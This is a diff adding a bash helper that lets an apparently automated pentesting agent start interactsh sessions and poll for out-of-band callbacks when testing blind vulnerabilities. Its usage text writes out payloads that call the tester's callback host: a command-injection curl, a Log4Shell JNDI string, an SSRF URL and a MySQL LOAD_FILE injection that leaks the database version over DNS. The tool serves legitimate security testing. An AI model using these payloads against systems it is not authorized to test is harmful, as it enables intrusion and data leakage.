@@ -1,0 +1,82 @@
+#!/usr/bin/env bash
+# oob — out-of-band (OOB) interaction helper for the ARTEX agent.
+#
+# Wraps projectdiscovery/interactsh-client to give the agent a simple, stateless
+# interface for testing *blind* vulnerabilities (blind SQLi, SSRF, blind RCE,
+# OOB XXE, Log4Shell, blind XSS, blind command injection, etc.): obtain a unique
+# callback domain, embed it in a payload, then poll for the DNS/HTTP/SMTP
+# callbacks that prove the target reached out.
+#
+# A long-lived interactsh-client session runs in the background (detached with
+# setsid so it survives the short-lived exec that started it); its unique domain
+# and its interaction log live under $OOB_DIR so later `oob poll` calls can read
+# them from a separate process.
+set -uo pipefail
+
+OOB_DIR="${OOB_DIR:-/tmp/oob}"
+mkdir -p "$OOB_DIR"
+LOG="$OOB_DIR/interactions.jsonl"
+DOMAIN_FILE="$OOB_DIR/domain.txt"
+PID_FILE="$OOB_DIR/client.pid"
+STDOUT="$OOB_DIR/client.out"
+
+alive() { [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE" 2>/dev/null)" 2>/dev/null; }
+
+cmd="${1:-help}"
+case "$cmd" in
+  new|start)
+    if alive; then kill "$(cat "$PID_FILE")" 2>/dev/null || true; sleep 1; fi
+    : > "$LOG"; : > "$STDOUT"; rm -f "$DOMAIN_FILE"
+    # -json: one JSON object per interaction into $LOG ; -v: print the payload domain on startup.
+    setsid nohup interactsh-client -json -o "$LOG" -v >"$STDOUT" 2>&1 &
+    echo $! > "$PID_FILE"
+    d=""
+    for _ in $(seq 1 40); do
+      d=$(grep -oiE '[a-z0-9]+\.oast\.[a-z]+' "$STDOUT" 2>/dev/null | head -1)
+      [ -n "$d" ] && break
+      sleep 0.5
+    done
+    if [ -z "$d" ]; then
+      echo "ERROR: interactsh-client did not return a domain within 20s. Client output:" >&2
+      sed -n '1,40p' "$STDOUT" >&2
+      exit 1
+    fi
+    echo "$d" > "$DOMAIN_FILE"
+    echo "$d"
+    ;;
+  domain)
+    if [ -s "$DOMAIN_FILE" ]; then cat "$DOMAIN_FILE"; else echo "no active OOB session — run: oob new" >&2; exit 1; fi
+    ;;
+  poll|check)
+    alive || echo "(note: no live session; showing any interactions already captured)" >&2
+    if [ ! -s "$LOG" ]; then echo "no OOB interactions received yet"; exit 0; fi
+    n=$(wc -l < "$LOG")
+    echo "== $n OOB interaction(s) =="
+    jq -rc '"\(.timestamp // "?")  \((.protocol // "?")|ascii_upcase)  from=\(.["remote-address"] // "?")  id=\(.["full-id"] // .["unique-id"] // "")"' "$LOG" 2>/dev/null || cat "$LOG"
+    ;;
+  raw)
+    cat "$LOG" 2>/dev/null || echo "no interactions" ;;
+  stop)
+    if [ -f "$PID_FILE" ]; then kill "$(cat "$PID_FILE")" 2>/dev/null || true; rm -f "$PID_FILE"; fi
+    echo "OOB session stopped" ;;
+  *)
+    cat <<'USAGE'
+oob — out-of-band interaction testing (interactsh)
+
+  oob new     Start a session and print your unique OOB domain (e.g. c9x1a.oast.pro).
+              Embed this domain in a payload; any DNS/HTTP/SMTP hit to it is logged.
+  oob domain  Print the current session's OOB domain again.
+  oob poll    Show the OOB interactions (DNS/HTTP/SMTP callbacks) received so far.
+  oob raw     Dump raw JSON interactions.
+  oob stop    End the session.
+
+Typical blind-vuln flow:
+  D=$(oob new)
+  # SSRF:     curl "https://target/api?url=http://$D/"
+  # blind RCE: payload  ;curl http://$D/rce ;  or  nslookup $D
+  # Log4Shell: '${jndi:ldap://'"$D"'/x}'  in an injectable header/field
+  # blind SQLi(MySQL): ...UNION SELECT LOAD_FILE(CONCAT('\\\\',(select version()),'.'"$D"'\\x'))
+  oob poll    # a matching DNS/HTTP callback confirms the vulnerability
+USAGE
+    ;;
+esac
